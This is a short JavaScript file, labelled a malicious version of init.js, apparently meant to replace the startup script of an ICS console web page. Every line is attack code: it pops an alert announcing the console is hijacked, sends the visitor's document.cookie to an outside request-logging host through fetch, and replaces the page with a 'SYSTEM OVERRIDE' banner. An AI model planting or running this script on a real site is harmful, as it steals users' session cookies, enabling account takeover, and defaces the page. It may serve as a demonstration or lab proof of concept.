// Malicious version of init.js
alert("💥 ICS Console Hijacked by Atharva!");

fetch("https://your-request-logger.com/log?c=" + document.cookie);

// Optional: overwrite the DOM to simulate takeover
document.body.innerHTML = "<h1 style='color:red'>SYSTEM OVERRIDE</h1>";
